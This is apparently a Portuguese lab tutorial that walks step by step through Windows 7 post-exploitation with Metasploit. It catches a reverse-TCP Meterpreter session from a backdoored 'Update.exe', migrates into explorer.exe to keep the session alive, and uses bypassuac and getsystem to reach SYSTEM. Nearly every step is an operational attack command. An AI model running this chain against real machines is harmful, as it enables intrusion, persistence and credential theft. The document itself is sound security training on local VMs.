## Escalonamento de privilégios no Windows

Pós-exploração refere-se a quaisquer ações tomadas após a abertura de uma sessão. É quando eu ajo após conseguir acessar a máquina-alvo através da vulnerabilidade. 

Uma sessão é um shell aberto de uma exploração bem-sucedida ou de um ataque de força bruta, que por sua vez pode ser um shell padrão ou Meterpreter. O Meterpreter cria uma sessão para interagirmos com o computador remoto.

Neste exemplo vamos utilizar o backdoor na executável criado no exemplo anterior. 

### 1º - Abrir a VM do Kali Linux e do Windows (no meu caso estou usando o Windows 7)

### 2º - No terminal do Kali Linux alternar para usuário root. Este comando pedirá a senha de login do Kali Linux.

Comando: sudo su 

![sudo](https://i.imgur.com/BG9VgJg.jpeg)

&nbsp;

### 3º - Iniciar o Metasploit

Comando: msfconsole

![msfconsole](https://i.imgur.com/OvsY1Hq.jpeg)

&nbsp;

### 4º - Iniciar o multi/handler. 

Uma vez que a conexão é estabelecida, o multi/handler gerencia a sessão, permitindo ao atacante interagir com o sistema alvo (por exemplo, através de um shell do Meterpreter).

Comando: use multi/handler

![multi](https://i.imgur.com/7Np5S3R.jpeg)

&nbsp;

### 5º - Configurar o payload. 

O payload é o código malicioso ou script que o atacante ou pentester deseja que o sistema alvo execute. Após selecionar o payload, comandos adicionais como set LHOST (endereço IP do atacante) e set LPORT (porta de escuta) são usados para configurar como o payload se conectará de volta à máquina do Kali Linux. 																	

Comando: set payload windows/meterpreter/reverse_tcp 	

![payload](https://i.imgur.com/gyf0emM.jpeg)

&nbsp;

### 6º - Configurar meu local host obtendo o número IP da minha máquina com o comando ip addr, em seguida configurar o lhost com o número ip da minha máquina e o lport com a porta que foi estabelecida no comando msfvenom. Na sequência habilitar o exploit com o comando run. Á partir disso, a qualquer momento em que o alvo executar o comando Update.exe na máquina windows dele vamos iniciar uma sessão e estabelecer conexão.  

Comando: set lhost 192.168.56.102	

Comando: set lport 4444		

Comando: run 

![run](https://i.imgur.com/MsgMTOI.jpeg)

&nbsp;

### 7º - Conexão estabelecida - quando o alvo clica e abre o arquivo Update.exe no windows dele abre uma comunicação com o Meterpreter, o que significa que já estou dentro da máquina dele. Ou seja, iniciei uma sessão, que inclusive gerou um número id. À partir dessa conexão é que iniciamos a pós-exploração.

![conexão](https://i.imgur.com/Rkf1NHl.jpeg)

&nbsp;

### 8º - Início da pós-exploração

Podemos iniciar capturando algumas informações da máquina invadida.

Comando: sysinfo

![sysinfo](https://i.imgur.com/qkiuE5c.jpeg)

&nbsp;

### 9º - Descobrir o nome de usuário da máquina invadida.

Comando: getuid

![getuid](https://i.imgur.com/6Crd2wi.jpeg)

&nbsp;

### 10º - Me tornar um usuário administrador dentro do sistema.

Comando: getsystem

![getsystem](https://i.imgur.com/H9pDhdE.jpeg)

&nbsp;

### 11º - Após me tornar um usuário administrador dentro do sistema invadido, descubro o número do processo do executável malicioso em execução no sistema do windows (PID - Process IDentification)

Comando: getpid

![getpid](https://i.imgur.com/Igbi7OI.jpeg)

&nbsp;

### 12º - Se o usuário fechar o arquivo executável malicioso na máquina dele eu perco a sessão. Para evitar que isso aconteça eu rodo o comando ps para visualizar todos os serviços que rodam na máquina invadida, escolho o PID de algum serviço e migro do PID do arquivo executável malicioso para o PID desse outro processo da máquina invadida. 

Neste exemplo eu escolhi o PID do explorer.exe, que é um processo que está sempre rodando no windows, e migrei pra ele através do comando migrate.

Comando: ps

Comando: migrate númeroPID

![ps](https://i.imgur.com/qaHm5IK.jpeg)

&nbsp;

![migrate](https://i.imgur.com/pbQ0LW5.jpeg)

&nbsp;

Se eu rodar o comando getpid eu confirmo se migrou ou não, e abrindo a guia de processos do gerenciador de tarefas do Windows eu consigo verificar que a migração foi concluída porque o arquivo malicioso Update.exe não aparece mais nessa lista, e sim o novo processo executável para o qual migrei, nesse caso o explorer.exe.

![getpid1](https://i.imgur.com/AtF2Ng2.jpeg)

&nbsp;

## Trabalhando com privilégios 

### 13º - Abrir o Shell do Windows no Kali (vai aparecer o cmd.exe no gerenciador de tarefas do windows)

Comando: shell

![shell](https://i.imgur.com/NWB35Uy.jpeg)

&nbsp;

### 14º - Confirmar se estou como usuário ou administrador do Windows. Neste caso ainda estou como usuário. 

Comando: whoami

![whoami](https://i.imgur.com/2mBzV07.jpeg)

&nbsp;

### 15º - Explorando mais informações com o whoami. 

Com este comando consigo visualizar meus privilégios como usuário, ou seja, quais opções estão habilitadas ou desabilitadas para meu usuário atual.

Comando: whoami /priv

![priv](https://i.imgur.com/JE2KNRv.jpeg)

&nbsp;

### 16º - Escalando privilégios

Primeiro eu preciso sair do shell para trabalharmos na UAC (User Account Control), que é o mecanismo do Windows de controle de acessos.

Comando: exit		

![exit](https://i.imgur.com/6b8PDcj.jpeg)																			

&nbsp;

### 17º - Trabalhando com UAC

UAC (Controle de Conta de Usuário) é um recurso de segurança do Windows que impede alterações não autorizadas no sistema ao solicitar permissão de administrador para ações de alto risco.														Ao sairmos do Shell automaticamente estamos em UAC. Sendo assim, o primeiro passo é transferir a sessão (conexão) para background.

Comando: background

![background](https://i.imgur.com/2RKaFnl.jpeg)

&nbsp;

### 18º - Em seguida, rodando o comando sessions consigo visualizar as sessões que estão ativas.

Comando: sessions

![sessions](https://i.imgur.com/sZ8tlQt.jpeg)

&nbsp;

### 19º - Em seguida, abriremos outra sessão. Porém, antes, vamos pesquisar quais são os exploits que atuam sobre UAC com o comando abaixo.

Comando: search uac

Encontramos o exploit/windows/local/bypassuac e vamos utilizá-lo.

![uac](https://i.imgur.com/AIa8ATp.jpeg)

&nbsp;

### 20º - Configurando o exploit e mostrando as opções.

Comando: use exploit/windows/local/bypassuac

Comando: show options

Aqui vemos que eu preciso definir qual é a sessão. A sessão que jogamos pra background e que estabelecemos por meio do exploit será utilizada pelo bypassuac para fazermos o escalonamento de privilégios.

![options](https://i.imgur.com/Ay3nmjL.jpeg)

&nbsp;

### 21º - Setando o payload e os targets (arquitetura do windows).

Comando: set payload windows/meterpreter/reverse_tcp

Comando: show targets

Comando: set target 0

O Windows tem duas arquiteturas de sistema, o x86 (32 bits) e o x64 (64 bits). Neste exemplo vamos usar o target 0 porque o Windows que estamos atacando (Windows 7) é x86 (32 bits).

![target](https://i.imgur.com/YC4tdsR.jpeg)

&nbsp;

### 22º - Em seguida, estabelecemos a sessão com lhost e lport e acionamos show options para confirmar. 

Comando: set lhost 192.168.56.102 (ip da minha VM do Kali Linux)

Comando: set lport 2022 (pode ser qualquer número)

Comando: show options

![show](https://i.imgur.com/AJYvLyz.jpeg)

&nbsp;

### 23º - Em seguida precisamos iniciar a sessão do exploit que abrimos com o backdoor

Comando: set session 1

![set](https://i.imgur.com/7OJFAAX.jpeg)

&nbsp;

### 24º - Em seguida rodamos o exploit.

Comando: exploit 

![exploit](https://i.imgur.com/TZU2Ixp.jpeg)

&nbsp;

### 25º - Agora precisamos escolher a sessão correta.

Ao acionarmos o comando sessions, o sistema pedirá o id da sessão. Para resolvermos isso acionamos o comando background, em seguida o comando sessions para visualizarmos as sessões ativas. Aqui o sistema mostrará duas sessões, a 1 e a 2. A sessão 1 é a do backdoor e a sessão 2 é a do meterpreter, onde iremos escalar de privilégio. Escolheremos a sessão 2 através do comando sessions 2.

Comando: background

Comando: sessions

Comando: sessions 2

![sessions2](https://i.imgur.com/9qHGLbj.jpeg)

&nbsp;

### 26º - Escalando privilégios com o getsystem

Na sequência acionamos o comando getuid para visualizarmos o nome de usuário. Depois, acionamos o comando getsystem para escalar privilégio e em seguida acionamos o comando getuid novamente para visualizarmos o nome de usuário e confirmarmos se escalamos de privilégio.

O comando getsystem, utilizado no Kali Linux dentro de uma sessão do Meterpreter (parte do framework Metasploit), serve para escalar privilégios na máquina alvo (geralmente Windows) para a conta NT AUTHORITY\\SYSTEM. 

A conta SYSTEM é a conta de usuário mais poderosa em um sistema operacional Windows, com controle total sobre quase todos os recursos do sistema.

Ao obter privilégios de SYSTEM, o usuário (ou atacante, em um teste de penetração) passa a ter controle irrestrito sobre a máquina, podendo executar comandos que um usuário normal não conseguiria, como despejar hashes de senha (hashdump), carregar extensões adicionais ou manipular arquivos críticos do sistema.

Comando: getuid

Comando: getsystem

comando: getuid

![getsystem](https://i.imgur.com/9qHGLbj.jpeg)

&nbsp;

### 27º - Ao acionar o comando shell no Kali, abro o processo cmd.exe no windows e já estou dentro dele.

Comando: shell

![shell1](https://i.imgur.com/AJ6MGN3.jpeg)

&nbsp;

### 28º - Acionando o comando whoami eu consigo visualizar que escalei de privilégio para admin e que meu usuário é o autoridade nt/sistema

Comando: whoami

![whoami](https://i.imgur.com/lcuzMSw.jpeg)

&nbsp;

### 29º - Acionando o comando whoami /priv eu consigo visualizar quais privilégios/controle eu tenho sobre o sistema operacional. Vejo que agora tenho controle praticamente sobre todo o sistema operacional do Windows 7.

Comando: whoami /priv

![priv](https://i.imgur.com/75Vemz7.jpeg)

&nbsp;
